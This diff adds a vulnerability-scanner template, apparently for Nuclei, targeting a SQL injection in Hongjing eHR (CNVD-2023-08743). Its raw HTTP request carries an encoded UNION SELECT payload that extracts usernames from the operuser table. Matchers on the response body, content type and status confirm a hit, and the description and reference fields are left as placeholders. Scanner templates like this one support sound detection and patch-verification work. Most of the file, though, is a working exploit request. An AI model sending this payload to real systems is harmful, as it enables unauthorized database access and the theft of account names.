@@ -1,0 +1,32 @@
+id: hongjing_HCM_codesettree_sqli
+info:
+  name: 宏景eHR SQL注入漏洞复现（CNVD-2023-08743）
+  author: mhb17
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: sqli
+requests:
+  - raw:
+      - |+
+        GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ' <TreeNode id="1"'
+      - type: word
+        part: header
+        words:
+          - 'Content-Type: text/xml'
+      - type: word
+        part: header
+        words:
+          - '200'
